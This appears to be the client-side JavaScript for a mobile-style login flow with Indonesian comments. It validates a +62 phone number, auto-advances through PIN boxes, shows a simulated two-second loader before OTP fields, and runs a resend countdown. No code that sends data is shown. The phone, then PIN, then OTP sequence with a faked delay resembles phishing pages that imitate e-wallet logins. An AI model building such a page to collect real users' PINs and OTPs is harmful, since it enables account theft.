function next(step) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  document.getElementById('screen' + step).classList.add('active');
}

// VALIDASI NOMOR
const phoneInput = document.getElementById('phone');
const btnPhone = document.getElementById('btnPhone');

phoneInput.addEventListener('input', () => {
  let val = phoneInput.value.replace(/[^0-9]/g, '');
  if (!val.startsWith('62')) val = '62' + val;

  phoneInput.value = '+' + val;
  btnPhone.disabled = val.length < 10;
});

btnPhone.onclick = () => next(3);

// AUTO INPUT
function setup(container, button) {
  const inputs = document.querySelectorAll(`#${container} input`);

  inputs.forEach((input, i) => {
    input.addEventListener('input', () => {
      if (input.value && i < inputs.length - 1) {
        inputs[i + 1].focus();
      }
      check(inputs, button);
    });

    input.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !input.value && i > 0) {
        inputs[i - 1].focus();
      }
    });
  });
}

function check(inputs, button) {
  button.disabled = [...inputs].some(i => !i.value);
}

setup('pinInputs', document.getElementById('btnPin'));

// PIN CLICK
document.getElementById('btnPin').onclick = () => {
  document.getElementById('otpOverlay').classList.add('active');

  setTimeout(() => {
    document.getElementById('loader').style.display = 'none';
    document.getElementById('otpInputs').style.display = 'flex';
  }, 2000);
};

// TIMER OTP
let time = 60;
setInterval(() => {
  if (time > 0) {
    time--;
    document.getElementById('timer').innerText = `Kirim ulang (${time}s)`;
  }
}, 1000);
